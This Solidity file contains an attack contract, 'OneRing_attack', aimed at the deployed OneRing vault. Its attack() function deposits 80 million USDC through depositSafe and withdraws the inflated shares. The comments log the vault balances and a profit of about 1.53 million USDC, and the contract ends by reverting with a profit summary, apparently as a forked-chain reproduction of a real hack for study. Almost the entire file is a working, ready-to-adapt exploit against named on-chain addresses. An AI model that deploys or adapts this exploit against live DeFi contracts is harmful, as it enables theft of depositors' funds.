// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";


contract OneRing_attack {
    IUSDC USDC = IUSDC(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);    
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);
    // source code at 0xC06826F52F29B34C5d8b2C61aBf844CEBCf78ABF

    string str1 = "";
    string str2 = "";

    string str89 = "";
    string str90 = "";


    constructor() payable {
        USDC.approve(address(vault), 2**256 - 1);
    }

    receive() external payable {}

    function attack() public {
        // ===================== Flashloan of 1 5000 0000 USDC ==================

        // Action 1: DepositSafe    USDC --> OShare    State: vault
        //                          State: vault
        // str1 = VaultSummary();
        // uint OShareGot = vault.balanceOf(address(this));

        vault.depositSafe(80000000*1e6,address(USDC),0);
        
        // OShareGot = ( vault.balanceOf(address(this)) - OShareGot ) / 1e18;
        // str2 = VaultSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(OShareGot))));
        // balanceWithInvested: 4448686 totalSupply: 4185979 
        // balanceWithInvested: 52454109 totalSupply: 46151491 
        // 41965511

        // Action 2: WithdrawOShare    OShare --> USDC    State: vault
        //                          State: vault

        // str1 = VaultSummary();
        // uint USDCGot = USDC.balanceOf(address(this));

        vault.withdraw( 41965511 * 1e18, address(USDC));

        // USDCGot = ( USDC.balanceOf(address(this)) - USDCGot ) / 1e6;
        // str2 = VaultSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(USDCGot))));
        // balanceWithInvested: 52454109 totalSupply: 46151491 
        // balanceWithInvested: 2809139 totalSupply: 4185980 
        // 81534752


        revert(ProfitSummary());
        // Profit: 151534752 - 150000000 = 1534752 USDC

    }

    function VaultSummary() internal returns (string memory _uintAsString) {
        uint balanceWithInvested = vault.balanceWithInvested() / 10 ** 18;
        uint totalSupply = vault.totalSupply() / 10 ** 18;
        str89 = append("balanceWithInvested: ", uint2str(balanceWithInvested));
        str90 = append(" totalSupply: ", uint2str(totalSupply));
        return append(str89, str90);
    }

    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDC.balanceOf(address(this)) / 10 ** 6;
        return append("USDC balance: ", uint2str(balance1));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}

